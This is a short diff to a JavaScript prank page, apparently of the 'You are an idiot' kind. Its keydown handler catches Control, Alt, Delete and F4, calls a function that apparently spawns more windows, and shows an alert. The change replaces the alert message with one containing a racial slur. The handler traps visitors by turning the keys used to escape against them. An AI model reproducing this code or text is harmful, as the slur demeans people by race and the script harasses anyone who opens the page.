@@ -13,7 +13,7 @@ window.onkeydown = async () => {
 	if (['Control', 'Alt', 'Delete', 'F4'].includes(event.key)) {
 		await proCreate(3);
 
-		alert("You are an idiot!");
+		alert("YOU'VE BEEN NIGGIFIED");
 	}
 
 	return null;
